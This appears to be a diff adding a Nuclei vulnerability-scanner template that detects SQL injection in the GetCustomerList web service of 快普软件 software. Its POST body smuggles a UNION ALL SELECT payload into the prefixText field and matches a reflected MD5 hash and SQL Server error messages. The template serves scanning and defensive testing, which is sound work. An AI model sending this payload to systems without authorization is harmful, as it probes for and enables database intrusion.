@@ -1,0 +1,31 @@
+id: kuaipu-getcustomerlist-sqli
+info:
+  name: 快普软件 GetCustomerList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 快普软件's GetCustomerList function. This template checks for the injection by verifying MD5 hash reflections in the response body.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/WebService/wsAutoComplete.asmx/GetCustomerList'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "prefixText=a'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL--&count=1&contextKey=a"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - contains(body, '0x' + t2)
+          - '!contains(body, "<")'
+          - matches(body, '转换成数据类型(.*?)时失败')
+          - matches(body, '在将(.*?)值')
